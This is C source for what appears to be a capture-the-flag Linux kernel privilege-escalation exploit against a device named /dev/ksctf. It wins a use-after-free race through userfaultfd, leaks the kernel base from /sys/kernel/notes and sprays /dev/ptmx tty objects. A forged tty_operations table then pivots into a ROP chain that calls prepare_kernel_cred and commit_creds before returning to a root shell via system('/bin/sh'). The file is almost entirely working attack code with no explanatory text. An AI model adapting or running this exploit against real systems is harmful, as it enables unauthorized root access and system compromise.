#include<stdio.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include <stdlib.h>
#include <string.h>
#include<unistd.h>
#include<sys/mman.h>
#include<signal.h>
#include<pthread.h>
#include<linux/userfaultfd.h>
#include <sys/ioctl.h>
#include<syscall.h>
#include<poll.h>
#include <semaphore.h>
#pragma pack(16)
#define __int64 long long
#define CLOSE printf("\033[0m\n");
#define RED printf("\033[31m");
#define GREEN printf("\033[36m");
#define BLUE printf("\033[34m");
#define YELLOW printf("\033[33m");
#define showAddr(var) _showAddr(#var,var);

size_t raw_vmlinux_base = 0xffffffff81000000;
size_t raw_direct_base=0xffff888000000000;
size_t commit_creds = 0,prepare_kernel_cred = 0;
size_t vmlinux_base = 0;
size_t swapgs_restore_regs_and_return_to_usermode=0;
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status();
size_t find_symbols();
void _showAddr(char*name,size_t data);
void errExit(char * msg);
void getshell(void);
size_t cvegetbase();
int dev_fd;

sem_t sem[3];
size_t heap_addr;


typedef struct __attribute__((aligned(16)))
{
   size_t uffd;
   struct uffdio_api uapi;
   struct uffdio_register uregister;
}reg_user,*p_imgae_reg;

void Register_Userfalutfd(void* addr,size_t length,void* (*handler)(void*)){
   YELLOW;printf("Register_Userfalutfd START");CLOSE;
   reg_user reguser={0};
   p_imgae_reg preg=&reguser;
   preg->uffd=syscall(__NR_userfaultfd,__O_CLOEXEC|O_NONBLOCK);
   if(preg->uffd<0){
      errExit("__NR_userfaultfd");
   }
   preg->uapi.api=UFFD_API;
   preg->uapi.features=0;
   if(ioctl(preg->uffd,UFFDIO_API,&preg->uapi)<0)errExit("ioctl ->UFFDIO_API");
   preg->uregister.mode=UFFDIO_REGISTER_MODE_MISSING;
   preg->uregister.range.start=addr;
   preg->uregister.range.len=length;
   if(ioctl(preg->uffd,UFFDIO_REGISTER,&preg->uregister)<0)errExit("ioctl -> UFFDIO_REGISTER");
   pthread_t thread;
   if(pthread_create(&thread,NULL,handler,(void*)preg->uffd)<0)errExit("pthread_create handler");
   YELLOW;printf("Register_Userfalutfd END");CLOSE;
}

void Userfault_Handler(int uffd){
   RED;printf("Userfault_Handler START");CLOSE;
   struct uffd_msg msg={0};
   struct uffdio_copy ufcopy={0};
   size_t* data=(size_t*)mmap(NULL,0x1000,3,0x20|0x2,-1,0);
   if(data<0)errExit("Userfault_Handler mmap");
   size_t fake_tty_operation[0x20] = {
         0xffffffff00000000,
         0xffffffff00000001,
         0xffffffff00000002,
         0xffffffff00000003,
         0xffffffff00000004,
         0xffffffff00000005,
         0xffffffff00000006,
         0xffffffff00000007,
         0xffffffff00000008,
         0xffffffff00000009,
         0xffffffff0000000a,
         0xffffffff0000000b,
         0xffffffff0000000c
   };
   size_t offset=vmlinux_base-raw_vmlinux_base;
   size_t rop[0x20]={
         0xffffffff81003e98+offset,
         0,
         prepare_kernel_cred,
         0xffffffff81025c18+offset,
         0,
         commit_creds,
         swapgs_restore_regs_and_return_to_usermode+0x31,
         0,
         0,
         getshell,
         user_cs,
         user_rflags,
         user_sp,
         user_ss
   };
   int idx=20;
   data[0]=0x0000000100005401;
   data[1]=0;
   data[2]=heap_addr;
   data[3]=heap_addr;
   data[4]=heap_addr+(0x8*20);
   data[12]=0xffffffff81572fb3+offset;
   showAddr(data[12]);
   for (size_t i = 0; i < 20; i++)
   {
      data[idx++]=rop[i];
   }

 /*
 rcx=0 rdx=data
0xffffffff81572fb3 : push qword ptr [rcx + rdx + 0x31] ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0xffffffff81003e98 : pop rdi ; ret
0xffffffff81025c18 : mov rdi, rax ; mov eax, ebx ; pop rbx ; or rax, rdi ; ret
 */  
   do
   {
      struct pollfd pf={0};
      pf.fd=uffd;
      pf.events=POLLIN;
      poll(&pf,1,-1);
      read(uffd,&msg,sizeof(msg));
      if(msg.event<=0){
         printf("event NULL");
         continue;
      }
      RED;printf("sem step 0");CLOSE;
      sem_post(&sem[0]);
      sem_wait(&sem[1]);
      RED;printf("sem step 1");CLOSE;
      ufcopy.dst=msg.arg.pagefault.address & ~(sysconf(_SC_PAGE_SIZE)-1);
      ufcopy.src=data;
      ufcopy.len=sysconf(_SC_PAGE_SIZE);
      ioctl(uffd,UFFDIO_COPY,&ufcopy);
      sem_post(&sem[2]);
      RED;printf("sem step 2");CLOSE;
      break;

   } while (1);
   


   RED;printf("Userfault_Handler END");CLOSE;
}
int FILE_spary[20];

char passwd[64]={0};
void uaf(){
   size_t* ptr=(size_t*)(passwd+32);
   ptr[1]=0;
   sem_wait(&sem[0]);
   ioctl(dev_fd,0xFFF1,passwd);
   for (int i = 0; i < 20; i++)
   {
      FILE_spary[i]=open("/dev/ptmx",2);
   }
   sem_post(&sem[1]);
}

/*


*/

const char* FILESYM="/tmp/kallsyms\0";
const char* FileAttack="/dev/ksctf\0";

int main(void){
    save_status();
    BLUE;puts("[*]start");CLOSE;
    dev_fd = open(FileAttack,2);
    if(dev_fd < 0){
        errExit(FileAttack);
    }
   memset(passwd,0,64);
   passwd[32]=1;
   size_t* ptr=(size_t*)(passwd+32);
   ptr[0]=1;
   ptr[1]=passwd;
   ioctl(dev_fd,0xFFF0,passwd);
   heap_addr=*(size_t*)passwd;
   showAddr(heap_addr);
   vmlinux_base= cvegetbase();
   showAddr(vmlinux_base);
   prepare_kernel_cred=vmlinux_base+0x98140;
   commit_creds=vmlinux_base+0x97d00;
   swapgs_restore_regs_and_return_to_usermode=vmlinux_base+0xc00a74;

   sem_init(&sem[0],0,0);
   sem_init(&sem[1],0,0);
   sem_init(&sem[2],0,0);
   
   
   size_t map=mmap(0,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|0X20,-1,0);
   Register_Userfalutfd(map,0x1000,Userfault_Handler);
   pthread_t threadUAF;
   if(pthread_create(&threadUAF,0,(void* (*)(void*))uaf,0)<0)errExit("main pthread_create uaf");
   write(dev_fd,map,0x2e0);
   sem_wait(&sem[2]);
   getchar();
   for (size_t i = 0; i < 20; i++)
   {
      ioctl(FILE_spary[i],0,heap_addr+(-0x31+0x8*4));
   }

   BLUE;puts("[*]end");CLOSE;
   return 0;
}


void save_status(){
   __asm__("mov user_cs,cs;"
           "pushf;" //push eflags
           "pop user_rflags;"
           "mov user_sp,rsp;"
           "mov user_ss,ss;"
          );
}
size_t cvegetbase(){
   char buf[0x208]={0};
   int fd=open("/sys/kernel/notes",0);
   read(fd,buf,0x200);
   size_t cveaddr=*(size_t*)(buf+(0xa0-0x4));
   cveaddr-=0x2000;
   GREEN;printf("[*] %s -> 0x%llx ","cveaddr",cveaddr);CLOSE;
   return cveaddr;
}
size_t find_symbols(const char*FILENAME,__int64 commit_offset,__int64 prepare_offset){
   FILE* kallsyms_fd = fopen(FILENAME,"r");
   if(kallsyms_fd < 0){
      errExit(FILENAME);
   }

   char buf[0x30] = {0};
   while(fgets(buf,0x30,kallsyms_fd)){
      if(commit_creds & prepare_kernel_cred)return 0;
      //find commit_creds
      if(strstr(buf,"commit_creds") && !commit_creds){
         char hex[20] = {0};
         strncpy(hex,buf,16);
         sscanf(hex,"%llx",&commit_creds);
         printf("commit_creds addr: %p\n",commit_creds);
         
         vmlinux_base = commit_creds - commit_offset;
         printf("vmlinux_base addr: %p\n",vmlinux_base);
      }

      //find prepare_kernel_cred
      if(strstr(buf,"prepare_kernel_cred") && !prepare_kernel_cred){
         char hex[20] = {0};
         strncpy(hex,buf,16);
         sscanf(hex,"%llx",&prepare_kernel_cred);
         printf("prepare_kernel_cred addr: %p\n",prepare_kernel_cred);
         vmlinux_base = prepare_kernel_cred - prepare_offset;
      }
   }

   if(!commit_creds & !prepare_kernel_cred){
      puts("[*]read kallsyms error!");
      exit(0);
   }
} 

void getshell(void)
{   
    BLUE;printf("[*]Successful");CLOSE;
    system("/bin/sh");
}

void _showAddr(char*name,size_t data){
   BLUE;printf("[*] %s -> 0x%llx ",name,data);CLOSE;
}
void errExit(char * msg){
   RED;printf("[X] Error : %s !",msg);CLOSE;
   exit(-1);
}


